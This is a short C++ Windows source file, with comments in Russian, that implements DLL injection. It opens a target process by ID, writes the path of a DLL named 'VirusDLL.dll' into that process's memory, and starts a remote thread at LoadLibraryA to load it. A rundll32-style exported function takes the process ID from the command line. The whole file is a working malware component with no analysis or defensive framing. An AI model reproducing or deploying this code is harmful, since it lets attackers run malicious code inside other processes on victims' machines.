#include <Windows.h>
#include <winerror.h>

void DllInjector(DWORD dwProcessID) {
    char szDLLPathToInject[] = "VirusDLL.dll";
    int nDLLPathLen = lstrlenA(szDLLPathToInject);
    int nTotBytesToAllocate = nDLLPathLen + 1;

    // Открываем процесс
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwProcessID);
    if (hProcess == NULL) return;

    // Выделяем память в целевом процессе
    LPVOID lpHeapBaseAddress1 = VirtualAllocEx(hProcess, NULL, nTotBytesToAllocate, MEM_COMMIT, PAGE_READWRITE);
    if (lpHeapBaseAddress1 == NULL) {
        CloseHandle(hProcess);
        return;
    }

    // Записываем путь к DLL
    SIZE_T lNumberOfBytesWritten = 0;
    WriteProcessMemory(hProcess, lpHeapBaseAddress1, szDLLPathToInject, nTotBytesToAllocate, &lNumberOfBytesWritten);

    // Получаем адрес LoadLibraryA
    LPTHREAD_START_ROUTINE lpLoadLibraryStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryA");

    // Создаем удаленный поток
    CreateRemoteThread(hProcess, NULL, 0, lpLoadLibraryStartAddress, lpHeapBaseAddress1, 0, NULL);
    CloseHandle(hProcess);
}

extern "C" {
    __declspec(dllexport) void WINAPI HelperFunc(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
        DllInjector(atoi(lpszCmdLine));
    }
}